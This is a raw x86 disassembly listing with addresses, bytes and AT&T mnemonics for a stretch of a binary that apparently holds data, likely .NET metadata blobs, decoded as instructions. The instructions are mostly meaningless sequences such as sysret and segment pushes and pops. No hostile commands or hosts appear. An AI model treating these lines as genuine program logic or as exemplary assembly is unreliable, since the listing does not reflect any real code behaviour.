  40c7fc:	3c 06                	cmp    $0x6,%al
  40c7fe:	15 12 39 01 12       	adc    $0x12013912,%eax
  40c803:	3c 06                	cmp    $0x6,%al
  40c805:	15 11 25 01 12       	adc    $0x12012511,%eax
  40c80a:	3c 0a                	cmp    $0xa,%al
  40c80c:	0a 02                	or     (%edx),%al
  40c80e:	15 11 25 01 12       	adc    $0x12012511,%eax
  40c813:	3c 11                	cmp    $0x11,%al
  40c815:	1c 06                	sbb    $0x6,%al
  40c817:	0a 02                	or     (%edx),%al
  40c819:	11 29                	adc    %ebp,(%ecx)
  40c81b:	11 1c 05 00 02 0e 0e 	adc    %ebx,0xe0e0200(,%eax,1)
  40c822:	0e                   	push   %cs
  40c823:	0f 07                	sysret
  40c825:	07                   	pop    %es
  40c826:	08 12                	or     %dl,(%edx)
  40c828:	18 08                	sbb    %cl,(%eax)
  40c82a:	0e                   	push   %cs
  40c82b:	02 15 11 25 01 02    	add    0x2012511,%dl
  40c831:	12 2d 0b 20 00 15    	adc    0x1500200b,%ch
  40c837:	12 81 09 02 13 00    	adc    0x130209(%ecx),%al
  40c83d:	13 01                	adc    (%ecx),%eax
  40c83f:	09 00                	or     %eax,(%eax)
  40c841:	02 0e                	add    (%esi),%cl
  40c843:	0e                   	push   %cs
  40c844:	15 12 4d 01 0e       	adc    $0xe014d12,%eax
  40c849:	09 0a                	or     %ecx,(%edx)
  40c84b:	02 15 11 25 01 02    	add    0x2012511,%dl
  40c851:	11 20                	adc    %esp,(%eax)
  40c853:	10 10                	adc    %dl,(%eax)
  40c855:	01 02                	add    %eax,(%edx)
  40c857:	15 12 4d 01 1e       	adc    $0x1e014d12,%eax
  40c85c:	00 15 12 4d 01 1e    	add    %dl,0x1e014d12
  40c862:	00 08                	add    %cl,(%eax)
  40c864:	0c 10                	or     $0x10,%al
  40c866:	01 01                	add    %eax,(%ecx)
  40c868:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
  40c86d:	4d                   	dec    %ebp
  40c86e:	01 1e                	add    %ebx,(%esi)
  40c870:	00 0c 10             	add    %cl,(%eax,%edx,1)
  40c873:	01 02                	add    %eax,(%edx)
  40c875:	02 15 12 4d 01 1e    	add    0x1e014d12,%dl
  40c87b:	00 1e                	add    %bl,(%esi)
  40c87d:	00 03                	add    %al,(%ebx)
  40c87f:	0a 01                	or     (%ecx),%al
  40c881:	0e                   	push   %cs
  40c882:	15 07 0a 08 0e       	adc    $0xe080a07,%eax
  40c887:	1d 0e 1d 05 1d       	sbb    $0x1d051d0e,%eax
  40c88c:	05 02 08 1d 05       	add    $0x51d0802,%eax
  40c891:	15 11 25 01 02       	adc    $0x2012511,%eax
  40c896:	12 2d 05 00 00 12    	adc    0x12000005,%ch
  40c89c:	81 15 09 0a 02 15 11 	adcl   $0x2012511,0x15020a09
  40c8a3:	25 01 02 
  40c8a6:	11 24 1a             	adc    %esp,(%edx,%ebx,1)
  40c8a9:	07                   	pop    %es
  40c8aa:	0a 08                	or     (%eax),%cl
  40c8ac:	0e                   	push   %cs
  40c8ad:	0e                   	push   %cs
  40c8ae:	1d 05 0e 15 11       	sbb    $0x11150e05,%eax
  40c8b3:	25 01 0e 15 11       	and    $0x11150e01,%eax
  40c8b8:	25 01 09 09 15       	and    $0x15090901,%eax
  40c8bd:	11 25 01 02 12 2d    	adc    %esp,0x2d120201
  40c8c3:	05 15 12 39 01       	add    $0x1391215,%eax
  40c8c8:	0e                   	push   %cs
  40c8c9:	05 15 11 25 01       	add    $0x1251115,%eax
  40c8ce:	0e                   	push   %cs
  40c8cf:	09 0a                	or     %ecx,(%edx)
  40c8d1:	02 15 11 25 01 0e    	add    0xe012511,%dl
  40c8d7:	11 28                	adc    %ebp,(%eax)
  40c8d9:	05 15 12 39 01       	add    $0x1391215,%eax
  40c8de:	09 05 15 11 25 01    	or     %eax,0x1251115
  40c8e4:	09 09                	or     %ecx,(%ecx)
  40c8e6:	0a 02                	or     (%edx),%al
  40c8e8:	15 11 25 01 09       	adc    $0x9012511,%eax
  40c8ed:	11 28                	adc    %ebp,(%eax)
  40c8ef:	06                   	push   %es
  40c8f0:	00 03                	add    %al,(%ebx)
  40c8f2:	0e                   	push   %cs
  40c8f3:	0e                   	push   %cs
  40c8f4:	0e                   	push   %cs
  40c8f5:	0e                   	push   %cs
  40c8f6:	09 0a                	or     %ecx,(%edx)
  40c8f8:	02 15 11 25 01 02    	add    0x2012511,%dl
  40c8fe:	11 28                	adc    %ebp,(%eax)
  40c900:	12 07                	adc    (%edi),%al
  40c902:	07                   	pop    %es
  40c903:	08 12                	or     %dl,(%edx)
  40c905:	18 1d 05 08 15 11    	sbb    %bl,0x11150805
  40c90b:	25 01 1d 05 11       	and    $0x11051d01,%eax
  40c910:	29 12                	sub    %edx,(%edx)
  40c912:	2d 0a 0a 02 15       	sub    $0x15020a0a,%eax
  40c917:	11 25 01 1d 05 11    	adc    %esp,0x11051d01
  40c91d:	2c 06                	sub    $0x6,%al
  40c91f:	0a 02                	or     (%edx),%al
  40c921:	11 29                	adc    %ebp,(%ecx)
  40c923:	11 2c 04             	adc    %ebp,(%esp,%eax,1)
  40c926:	00 00                	add    %al,(%eax)
  40c928:	12 69 05             	adc    0x5(%ecx),%ch
  40c92b:	00 01                	add    %al,(%ecx)
  40c92d:	12 69 0e             	adc    0xe(%ecx),%ch
  40c930:	16                   	push   %ss
  40c931:	07                   	pop    %es
  40c932:	07                   	pop    %es
  40c933:	08 12                	or     %dl,(%edx)
  40c935:	18 1d 05 11 29 15    	sbb    %bl,0x15291105
  40c93b:	11 25 01 1d 05 15    	adc    %esp,0x15051d01
  40c941:	11 25 01 02 12 2d    	adc    %esp,0x2d120201
  40c947:	05 00 01 12 11       	add    $0x11120100,%eax
  40c94c:	08 06                	or     %al,(%esi)
  40c94e:	0a 02                	or     (%edx),%al
  40c950:	11 29                	adc    %ebp,(%ecx)
  40c952:	11 30                	adc    %esi,(%eax)
  40c954:	0a 0a                	or     (%edx),%cl
  40c956:	02 15 11 25 01 1d    	add    0x1d012511,%dl
  40c95c:	05 11 30 09 0a       	add    $0xa093011,%eax
  40c961:	02 15 11 25 01 02    	add    0x2012511,%dl
  40c967:	11 30                	adc    %esi,(%eax)
  40c969:	0a 0a                	or     (%edx),%cl
  40c96b:	02 15 11 25 01 1d    	add    0x1d012511,%dl
  40c971:	05 11 34 06 0a       	add    $0xa063411,%eax
  40c976:	02 11                	add    (%ecx),%dl
  40c978:	29 11                	sub    %edx,(%ecx)
  40c97a:	34 0c                	xor    $0xc,%al
  40c97c:	07                   	pop    %es
  40c97d:	04 08                	add    $0x8,%al
  40c97f:	1d 05 15 11 25       	sbb    $0x25111505,%eax
  40c984:	01 02                	add    %eax,(%edx)
  40c986:	12 2d 09 0a 02 15    	adc    0x15020a09,%ch
  40c98c:	11 25 01 02 11 38    	adc    %esp,0x38110201
  40c992:	06                   	push   %es
  40c993:	15 12 35 01 12       	adc    $0x12013512,%eax
  40c998:	3c 05                	cmp    $0x5,%al
  40c99a:	20 01                	and    %al,(%ecx)
  40c99c:	01 13                	add    %edx,(%ebx)
  40c99e:	00 04 07             	add    %al,(%edi,%eax,1)
  40c9a1:	01 11                	add    %edx,(%ecx)
  40c9a3:	48                   	dec    %eax
  40c9a4:	04 00                	add    $0x0,%al
  40c9a6:	00 11                	add    %dl,(%ecx)
  40c9a8:	45                   	inc    %ebp
  40c9a9:	04 0a                	add    $0xa,%al
  40c9ab:	01 11                	add    %edx,(%ecx)
  40c9ad:	48                   	dec    %eax
  40c9ae:	04 07                	add    $0x7,%al
  40c9b0:	01 11                	add    %edx,(%ecx)
  40c9b2:	44                   	inc    %esp
  40c9b3:	06                   	push   %es
  40c9b4:	15 11 3d 01 12       	adc    $0x12013d11,%eax
  40c9b9:	3c 08                	cmp    $0x8,%al
  40c9bb:	00 00                	add    %al,(%eax)
  40c9bd:	15 11 3d 01 13       	adc    $0x13013d11,%eax
  40c9c2:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c9c5:	01 11                	add    %edx,(%ecx)
  40c9c7:	44                   	inc    %esp
  40c9c8:	08 20                	or     %ah,(%eax)
  40c9ca:	00 15 12 39 01 13    	add    %dl,0x13013912
  40c9d0:	00 03                	add    %al,(%ebx)
  40c9d2:	07                   	pop    %es
  40c9d3:	01 02                	add    %eax,(%edx)
  40c9d5:	04 07                	add    $0x7,%al
  40c9d7:	01 11                	add    %edx,(%ecx)
  40c9d9:	4c                   	dec    %esp
  40c9da:	06                   	push   %es
  40c9db:	15 11 3d 01 1d       	adc    $0x1d013d11,%eax
  40c9e0:	05 04 0a 01 11       	add    $0x11010a04,%eax
  40c9e5:	4c                   	dec    %esp
  40c9e6:	04 07                	add    $0x7,%al
  40c9e8:	01 11                	add    %edx,(%ecx)
  40c9ea:	50                   	push   %eax
  40c9eb:	05 15 11 3d 01       	add    $0x13d1115,%eax
  40c9f0:	02 04 0a             	add    (%edx,%ecx,1),%al
  40c9f3:	01 11                	add    %edx,(%ecx)
  40c9f5:	50                   	push   %eax
  40c9f6:	04 07                	add    $0x7,%al
  40c9f8:	01 11                	add    %edx,(%ecx)
  40c9fa:	40                   	inc    %eax
  40c9fb:	04 0a                	add    $0xa,%al
  40c9fd:	01 11                	add    %edx,(%ecx)
  40c9ff:	40                   	inc    %eax
  40ca00:	1a 07                	sbb    (%edi),%al
  40ca02:	0a 08                	or     (%eax),%cl
  40ca04:	12 3c 02             	adc    (%edx,%eax,1),%bh
  40ca07:	1d 05 15 11 25       	sbb    $0x25111505,%eax
  40ca0c:	01 1d 05 15 11 25    	add    %ebx,0x25111505
  40ca12:	01 02                	add    %eax,(%edx)
  40ca14:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  40ca19:	12 2d 09 00 02 01    	adc    0x1020009,%ch
  40ca1f:	12 80 c1 11 81 29    	adc    0x298111c1(%eax),%al
  40ca25:	0a 0a                	or     (%edx),%cl
  40ca27:	02 15 11 25 01 1d    	add    0x1d012511,%dl
  40ca2d:	05 11 40 09 0a       	add    $0xa094011,%eax
  40ca32:	02 15 11 25 01 02    	add    0x2012511,%dl
  40ca38:	11 40 1f             	adc    %eax,0x1f(%eax)
  40ca3b:	07                   	pop    %es
  40ca3c:	0c 08                	or     $0x8,%al
  40ca3e:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40ca41:	3c 08                	cmp    $0x8,%al
  40ca43:	1d 05 1d 05 11       	sbb    $0x11051d05,%eax
  40ca48:	29 12                	sub    %edx,(%edx)
  40ca4a:	3c 15                	cmp    $0x15,%al
  40ca4c:	11 25 01 12 3c 15    	adc    %esp,0x153c1201
  40ca52:	11 25 01 02 1d 05    	adc    %esp,0x51d0201
  40ca58:	12 2d 0c 20 03 01    	adc    0x103200c,%ch
  40ca5e:	11 81 2d 11 81 31    	adc    %eax,0x3181112d(%ecx)
  40ca64:	11 81 35 05 20 00    	adc    %eax,0x200535(%ecx)
  40ca6a:	12 81 39 09 00 02    	adc    0x2000939(%ecx),%al
  40ca70:	12 11                	adc    (%ecx),%dl
  40ca72:	12 41 12             	adc    0x12(%ecx),%al
  40ca75:	81 39 06 0a 02 11    	cmpl   $0x11020a06,(%ecx)
  40ca7b:	29 11                	sub    %edx,(%ecx)
  40ca7d:	44                   	inc    %esp
  40ca7e:	0a 0a                	or     (%edx),%cl
  40ca80:	02 15 11 25 01 12    	add    0x12012511,%dl
  40ca86:	3c 11                	cmp    $0x11,%al
  40ca88:	44                   	inc    %esp
  40ca89:	09 0a                	or     %ecx,(%edx)
  40ca8b:	02 15 11 25 01 02    	add    0x2012511,%dl
  40ca91:	11 44 16 07          	adc    %eax,0x7(%esi,%edx,1)
  40ca95:	06                   	push   %es
  40ca96:	08 12                	or     %dl,(%edx)
  40ca98:	3c 15                	cmp    $0x15,%al
  40ca9a:	12 35 01 12 3c 11    	adc    0x113c1201,%dh
  40caa0:	29 15 11 81 41 01    	sub    %edx,0x1418111
  40caa6:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40caa9:	2d 05 00 00 12       	sub    $0x12000005,%eax
  40caae:	81 45 0a 20 03 12 81 	addl   $0x81120320,0xa(%ebp)
  40cab5:	49                   	dec    %ecx
  40cab6:	02 12                	add    (%edx),%dl
  40cab8:	81 4d 1c 0d 15 12 81 	orl    $0x8112150d,0x1c(%ebp)
  40cabf:	51                   	push   %ecx
  40cac0:	04 02                	add    $0x2,%al
  40cac2:	12 81 4d 1c 12 81    	adc    -0x7eede3b3(%ecx),%al
  40cac8:	49                   	dec    %ecx
  40cac9:	06                   	push   %es
  40caca:	20 01                	and    %al,(%ecx)
  40cacc:	01 12                	add    %edx,(%edx)
  40cace:	81 49 07 15 12 31 01 	orl    $0x1311215,0x7(%ecx)
  40cad5:	12 81 49 1d 30 01    	adc    0x1301d49(%ecx),%al
  40cadb:	04 12                	add    $0x12,%al
  40cadd:	11 15 12 81 51 04    	adc    %edx,0x4518112
  40cae3:	1e                   	push   %ds
  40cae4:	00 12                	add    %dl,(%edx)
  40cae6:	81 4d 1c 12 81 49 15 	orl    $0x15498112,0x1c(%ebp)
  40caed:	12 31                	adc    (%ecx),%dh
  40caef:	01 12                	add    %edx,(%edx)
  40caf1:	81 49 1e 00 1c 03 0a 	orl    $0xa031c00,0x1e(%ecx)
  40caf8:	01 02                	add    %eax,(%edx)
  40cafa:	06                   	push   %es
  40cafb:	0a 02                	or     (%edx),%al
  40cafd:	11 29                	adc    %ebp,(%ecx)
  40caff:	11 48 0f             	adc    %ecx,0xf(%eax)
  40cb02:	10 01                	adc    %al,(%ecx)
  40cb04:	01 15 12 35 01 1e    	add    %edx,0x1e013512
  40cb0a:	00 15 12 4d 01 1e    	add    %dl,0x1e014d12
  40cb10:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cb13:	01 12                	add    %edx,(%edx)
  40cb15:	3c 09                	cmp    $0x9,%al
  40cb17:	20 00                	and    %al,(%eax)
  40cb19:	15 11 81 41 01       	adc    $0x1418111,%eax
  40cb1e:	13 00                	adc    (%eax),%eax
  40cb20:	07                   	pop    %es
  40cb21:	15 11 81 41 01       	adc    $0x1418111,%eax
  40cb26:	12 3c 11             	adc    (%ecx,%edx,1),%bh
  40cb29:	07                   	pop    %es
  40cb2a:	06                   	push   %es
  40cb2b:	08 12                	or     %dl,(%edx)
  40cb2d:	3c 1d                	cmp    $0x1d,%al
  40cb2f:	05 1d 05 15 11       	add    $0x1115051d,%eax
  40cb34:	25 01 1d 05 12       	and    $0x12051d01,%eax
  40cb39:	2d 0a 0a 02 15       	sub    $0x15020a0a,%eax
  40cb3e:	11 25 01 1d 05 11    	adc    %esp,0x11051d01
  40cb44:	4c                   	dec    %esp
  40cb45:	0d 07 05 08 12       	or     $0x12080507,%eax
  40cb4a:	3c 02                	cmp    $0x2,%al
  40cb4c:	15 11 25 01 02       	adc    $0x2012511,%eax
  40cb51:	12 2d 09 0a 02 15    	adc    0x15020a09,%ch
  40cb57:	11 25 01 02 11 50    	adc    %esp,0x50110201
  40cb5d:	04 07                	add    $0x7,%al
  40cb5f:	01 11                	add    %edx,(%ecx)
  40cb61:	68 04 0a 01 11       	push   $0x11010a04
  40cb66:	68 04 07 01 11       	push   $0x11010704
  40cb6b:	64 04 0a             	fs add $0xa,%al
  40cb6e:	01 11                	add    %edx,(%ecx)
  40cb70:	64 06                	fs push %es
  40cb72:	15 12 35 01 1d       	adc    $0x1d013512,%eax
  40cb77:	05 0b 15 12 49       	add    $0x4912150b,%eax
  40cb7c:	02 1d 05 15 12 4d    	add    0x4d121505,%bl
  40cb82:	01 05 1b 10 02 02    	add    %eax,0x202101b
  40cb88:	15 12 4d 01 1e       	adc    $0x1e014d12,%eax
  40cb8d:	01 15 12 4d 01 1e    	add    %edx,0x1e014d12
  40cb93:	00 15 12 49 02 1e    	add    %dl,0x1e024912
  40cb99:	00 15 12 4d 01 1e    	add    %dl,0x1e014d12
  40cb9f:	01 05 0a 02 1d 05    	add    %eax,0x51d020a
  40cba5:	05 04 07 01 12       	add    $0x12010704,%eax
  40cbaa:	54                   	push   %esp
  40cbab:	04 07                	add    $0x7,%al
  40cbad:	01 1d 05 0c 00 05    	add    %ebx,0x5000c05
  40cbb3:	01 12                	add    %edx,(%edx)
  40cbb5:	80 c1 08             	add    $0x8,%cl
  40cbb8:	12 80 c1 08 08 04    	adc    0x40808c1(%eax),%al
  40cbbe:	07                   	pop    %es
  40cbbf:	01 11                	add    %edx,(%ecx)
  40cbc1:	6c                   	insb   (%dx),%es:(%edi)
  40cbc2:	04 0a                	add    $0xa,%al
  40cbc4:	01 11                	add    %edx,(%ecx)
  40cbc6:	6c                   	insb   (%dx),%es:(%edi)
  40cbc7:	04 07                	add    $0x7,%al
  40cbc9:	01 11                	add    %edx,(%ecx)
  40cbcb:	60                   	pusha
  40cbcc:	04 0a                	add    $0xa,%al
  40cbce:	01 11                	add    %edx,(%ecx)
  40cbd0:	60                   	pusha
  40cbd1:	16                   	push   %ss
  40cbd2:	07                   	pop    %es
  40cbd3:	09 08                	or     %ecx,(%eax)
  40cbd5:	12 58 1d             	adc    0x1d(%eax),%bl
  40cbd8:	05 1d 05 08 1d       	add    $0x1d08051d,%eax
  40cbdd:	05 12 54 15 11       	add    $0x11155412,%eax
  40cbe2:	25 01 1d 05 12       	and    $0x12051d01,%eax
  40cbe7:	2d 0a 0a 02 15       	sub    $0x15020a0a,%eax
  40cbec:	11 25 01 1d 05 11    	adc    %esp,0x11051d01
  40cbf2:	60                   	pusha
  40cbf3:	17                   	pop    %ss
  40cbf4:	07                   	pop    %es
  40cbf5:	09 08                	or     %ecx,(%eax)
  40cbf7:	12 58 1d             	adc    0x1d(%eax),%bl
  40cbfa:	05 08 15 11 25       	add    $0x25111508,%eax
  40cbff:	01 08                	add    %ecx,(%eax)
  40cc01:	11 81 5d 11 81 5d    	adc    %eax,0x5d81115d(%ecx)
  40cc07:	11 29                	adc    %ebp,(%ecx)
  40cc09:	12 2d 04 00 00 11    	adc    0x11000004,%ch
  40cc0f:	51                   	push   %ecx
  40cc10:	03 20                	add    (%eax),%esp
  40cc12:	00 08                	add    %cl,(%eax)
  40cc14:	06                   	push   %es
  40cc15:	15 11 81 61 01       	adc    $0x1618111,%eax
  40cc1a:	05 08 20 03 01       	add    $0x1032008,%eax
  40cc1f:	1d 13 00 08 08       	sbb    $0x8080013,%eax
  40cc24:	12 00                	adc    (%eax),%al
  40cc26:	03 15 12 39 01 08    	add    0x8013912,%edx
  40cc2c:	12 41 15             	adc    0x15(%ecx),%al
  40cc2f:	11 81 61 01 05 11    	adc    %eax,0x11050161(%ecx)
  40cc35:	81 65 05 15 12 39 01 	andl   $0x1391215,0x5(%ebp)
  40cc3c:	08 05 15 11 25 01    	or     %al,0x1251115
  40cc42:	08 09                	or     %cl,(%ecx)
  40cc44:	0a 02                	or     (%edx),%al
  40cc46:	15 11 25 01 08       	adc    $0x8012511,%eax
  40cc4b:	11 64 09 00          	adc    %esp,0x0(%ecx,%ecx,1)
  40cc4f:	02 11                	add    (%ecx),%dl
  40cc51:	81 5d 11 51 11 51 03 	sbbl   $0x3511151,0x11(%ebp)
  40cc58:	20 00                	and    %al,(%eax)
  40cc5a:	0d 06 20 01 01       	or     $0x1012006,%eax
  40cc5f:	1d 13 00 06 0a       	sbb    $0xa060013,%eax
  40cc64:	02 11                	add    (%ecx),%dl
  40cc66:	29 11                	sub    %edx,(%ecx)
  40cc68:	64 0f 07             	fs sysret
  40cc6b:	06                   	push   %es
  40cc6c:	08 12                	or     %dl,(%edx)
  40cc6e:	58                   	pop    %eax
  40cc6f:	1d 05 08 15 11       	sbb    $0x11150805,%eax
  40cc74:	25 01 08 12 2d       	and    $0x2d120801,%eax
  40cc79:	09 0a                	or     %ecx,(%edx)
  40cc7b:	02 15 11 25 01 08    	add    0x8012511,%dl
  40cc81:	11 68 15             	adc    %ebp,0x15(%eax)
  40cc84:	07                   	pop    %es
  40cc85:	0a 08                	or     (%eax),%cl
  40cc87:	12 58 02             	adc    0x2(%eax),%bl
  40cc8a:	1d 05 05 08 1d       	sbb    $0x1d080505,%eax
  40cc8f:	05 1d 05 15 11       	add    $0x1115051d,%eax
  40cc94:	25 01 08 12 2d       	and    $0x2d120801,%eax
  40cc99:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cc9e:	0e                   	push   %cs
  40cc9f:	09 0a                	or     %ecx,(%edx)
  40cca1:	02 15 11 25 01 08    	add    0x8012511,%dl
  40cca7:	11 6c 04 07          	adc    %ebp,0x7(%esp,%eax,1)
  40ccab:	01 11                	add    %edx,(%ecx)
  40ccad:	74 04                	je     0x40ccb3
  40ccaf:	20 01                	and    %al,(%ecx)
  40ccb1:	0e                   	push   %cs
  40ccb2:	0e                   	push   %cs
  40ccb3:	04 0a                	add    $0xa,%al
  40ccb5:	01 11                	add    %edx,(%ecx)
  40ccb7:	74 04                	je     0x40ccbd
  40ccb9:	00 01                	add    %al,(%ecx)
  40ccbb:	01 02                	add    %eax,(%edx)
  40ccbd:	0d 07 03 12 2d       	or     $0x2d120307,%eax
  40ccc2:	15 11 81 41 01       	adc    $0x1418111,%eax
  40ccc7:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40ccca:	3c 03                	cmp    $0x3,%al
  40cccc:	20 00                	and    %al,(%eax)
  40ccce:	1c 04                	sbb    $0x4,%al
  40ccd0:	07                   	pop    %es
  40ccd1:	01 11                	add    %edx,(%ecx)
  40ccd3:	29 18                	sub    %ebx,(%eax)
  40ccd5:	07                   	pop    %es
  40ccd6:	0a 08                	or     (%eax),%cl
  40ccd8:	02 0e                	add    (%esi),%cl
  40ccda:	0e                   	push   %cs
  40ccdb:	11 29                	adc    %ebp,(%ecx)
  40ccdd:	15 11 25 01 02       	adc    $0x2012511,%eax
  40cce2:	15 11 25 01 12       	adc    $0x12012511,%eax
  40cce7:	3c 12                	cmp    $0x12,%al
  40cce9:	2d 08 12 2d 04       	sub    $0x42d1208,%eax
  40ccee:	00 00                	add    %al,(%eax)
  40ccf0:	12 5d 05             	adc    0x5(%ebp),%bl
  40ccf3:	00 01                	add    %al,(%ecx)
  40ccf5:	01 12                	add    %edx,(%edx)
  40ccf7:	5d                   	pop    %ebp
  40ccf8:	06                   	push   %es
  40ccf9:	20 01                	and    %al,(%ecx)
  40ccfb:	01 12                	add    %edx,(%edx)
  40ccfd:	81 75 04 00 01 02 0e 	xorl   $0xe020100,0x4(%ebp)
  40cd04:	06                   	push   %es
  40cd05:	00 01                	add    %al,(%ecx)
  40cd07:	12 81 7d 0e 05 00    	adc    0x50e7d(%ecx),%al
  40cd0d:	02 01                	add    (%ecx),%al
  40cd0f:	0e                   	push   %cs
  40cd10:	0e                   	push   %cs
  40cd11:	07                   	pop    %es
  40cd12:	20 03                	and    %al,(%ebx)
  40cd14:	01 02                	add    %eax,(%edx)
  40cd16:	0e                   	push   %cs
  40cd17:	10 02                	adc    %al,(%edx)
  40cd19:	06                   	push   %es
  40cd1a:	0a 02                	or     (%edx),%al
  40cd1c:	11 29                	adc    %ebp,(%ecx)
  40cd1e:	11 74 09 0a          	adc    %esi,0xa(%ecx,%ecx,1)
  40cd22:	02 15 11 25 01 02    	add    0x2012511,%dl
  40cd28:	11 74 08 00          	adc    %esi,0x0(%eax,%ecx,1)
  40cd2c:	03 12                	add    (%edx),%edx
  40cd2e:	11 12                	adc    %edx,(%edx)
  40cd30:	41                   	inc    %ecx
  40cd31:	0e                   	push   %cs
  40cd32:	08 0a                	or     %cl,(%edx)
  40cd34:	0a 02                	or     (%edx),%al
  40cd36:	15 11 25 01 12       	adc    $0x12012511,%eax
  40cd3b:	3c 11                	cmp    $0x11,%al
  40cd3d:	74 05                	je     0x40cd44
  40cd3f:	20 01                	and    %al,(%ecx)
  40cd41:	12 55 03             	adc    0x3(%ebp),%dl
  40cd44:	05 20 01 12 55       	add    $0x55120120,%eax
  40cd49:	0e                   	push   %cs
  40cd4a:	04 20                	add    $0x20,%al
  40cd4c:	00 12                	add    %dl,(%edx)
  40cd4e:	55                   	push   %ebp
  40cd4f:	05 07 01 11 80       	add    $0x80110107,%eax
  40cd54:	9c                   	pushf
  40cd55:	05 15 11 3d 01       	add    $0x13d1115,%eax
  40cd5a:	0e                   	push   %cs
  40cd5b:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40cd60:	9c                   	pushf
  40cd61:	0a 07                	or     (%edi),%al
  40cd63:	06                   	push   %es
  40cd64:	0e                   	push   %cs
  40cd65:	18 08                	sbb    %cl,(%eax)
  40cd67:	12 55 09             	adc    0x9(%ebp),%dl
  40cd6a:	12 69 05             	adc    0x5(%ecx),%ch
  40cd6d:	00 01                	add    %al,(%ecx)
  40cd6f:	12 69 08             	adc    0x8(%ecx),%ch
  40cd72:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40cd78:	d5 0a                	aad    $0xa
  40cd7a:	3a 0f                	cmp    (%edi),%cl
  40cd7c:	07                   	pop    %es
  40cd7d:	05 15 12 35 01       	add    $0x1351215,%eax
  40cd82:	0e                   	push   %cs
  40cd83:	12 81 91 12 81 99    	adc    -0x667eed6f(%ecx),%al
  40cd89:	0e                   	push   %cs
  40cd8a:	0e                   	push   %cs
  40cd8b:	05 15 12 35 01       	add    $0x1351215,%eax
  40cd90:	0e                   	push   %cs
  40cd91:	05 20 00 12 81       	add    $0x81120020,%eax
  40cd96:	95                   	xchg   %eax,%ebp
  40cd97:	05 20 00 12 81       	add    $0x81120020,%eax
  40cd9c:	99                   	cltd
  40cd9d:	05 20 00 12 81       	add    $0x81120020,%eax
  40cda2:	9d                   	popf
  40cda3:	04 20                	add    $0x20,%al
  40cda5:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cda8:	0f 07                	sysret
  40cdaa:	05 0e 12 81 91       	add    $0x9181120e,%eax
  40cdaf:	12 81 95 12 81 99    	adc    -0x667eed6b(%ecx),%al
  40cdb5:	12 81 a1 03 07 01    	adc    0x10703a1(%ecx),%al
  40cdbb:	0e                   	push   %cs
  40cdbc:	03 00                	add    (%eax),%eax
  40cdbe:	00 08                	add    %cl,(%eax)
  40cdc0:	05 00 00 12 81       	add    $0x81120000,%eax
  40cdc5:	a9 03 20 00 0a       	test   $0xa002003,%eax
  40cdca:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cdcf:	1c 0a                	sbb    $0xa,%al
  40cdd1:	07                   	pop    %es
  40cdd2:	05 1d 05 12 55       	add    $0x5512051d,%eax
  40cdd7:	1d 05 08 05 06       	sbb    $0x6050805,%eax
  40cddc:	20 01                	and    %al,(%ecx)
  40cdde:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  40cde3:	20 02                	and    %al,(%edx)
  40cde5:	0e                   	push   %cs
  40cde6:	08 08                	or     %cl,(%eax)
  40cde8:	05 07 01 11 80       	add    $0x80110107,%eax
  40cded:	98                   	cwtl
  40cdee:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40cdf3:	98                   	cwtl
  40cdf4:	05 07 01 11 80       	add    $0x80110107,%eax
  40cdf9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40cdfa:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40cdff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40ce00:	05 07 01 11 80       	add    $0x80110107,%eax
  40ce05:	a8 05                	test   $0x5,%al
  40ce07:	0a 01                	or     (%ecx),%al
  40ce09:	11 80 a8 05 07 01    	adc    %eax,0x10705a8(%eax)
  40ce0f:	11 80 94 05 0a 01    	adc    %eax,0x10a0594(%eax)
  40ce15:	11 80 94 05 07 01    	adc    %eax,0x1070594(%eax)
  40ce1b:	11 80 90 05 0a 01    	adc    %eax,0x10a0590(%eax)
  40ce21:	11 80 90 05 07 01    	adc    %eax,0x1070590(%eax)
  40ce27:	11 80 a0 05 15 11    	adc    %eax,0x111505a0(%eax)
  40ce2d:	3d 01 09 05 0a       	cmp    $0xa050901,%eax
  40ce32:	01 11                	add    %edx,(%ecx)
  40ce34:	80 a0 05 07 01 11 80 	andb   $0x80,0x11010705(%eax)
  40ce3b:	80 06 10             	addb   $0x10,(%esi)
  40ce3e:	01 01                	add    %eax,(%ecx)
  40ce40:	08 1e                	or     %bl,(%esi)
  40ce42:	00 05 0a 01 11 80    	add    %al,0x8011010a
  40ce48:	80 1a 07             	sbbb   $0x7,(%edx)
  40ce4b:	0d 0e 12 69 0e       	or     $0xe69120e,%eax
  40ce50:	1d 0e 15 12 35       	sbb    $0x3512150e,%eax
  40ce55:	01 0e                	add    %ecx,(%esi)
  40ce57:	08 08                	or     %cl,(%eax)
  40ce59:	1d 0e 08 1d 0e       	sbb    $0xe1d080e,%eax
  40ce5e:	12 69 12             	adc    0x12(%ecx),%ch
  40ce61:	81 c1 0e 05 20 00    	add    $0x20050e,%ecx
  40ce67:	12 81 c5 05 20 00    	adc    0x2005c5(%ecx),%al
  40ce6d:	12 81 c9 06 20 01    	adc    0x12006c9(%ecx),%al
  40ce73:	1d 0e 1d 03 05       	sbb    $0x5031d0e,%eax
  40ce78:	20 02                	and    %al,(%edx)
  40ce7a:	0e                   	push   %cs
  40ce7b:	0e                   	push   %cs
  40ce7c:	0e                   	push   %cs
  40ce7d:	05 20 01 08 13       	add    $0x13080120,%eax
  40ce82:	00 09                	add    %cl,(%ecx)
  40ce84:	20 02                	and    %al,(%edx)
  40ce86:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40ce8b:	81 d5 0b 00 02 12    	adc    $0x1202000b,%ebp
  40ce91:	81 c1 11 81 d9 11    	add    $0x11d98111,%ecx
  40ce97:	81 dd 07 20 02 12    	sbb    $0x12022007,%ebp
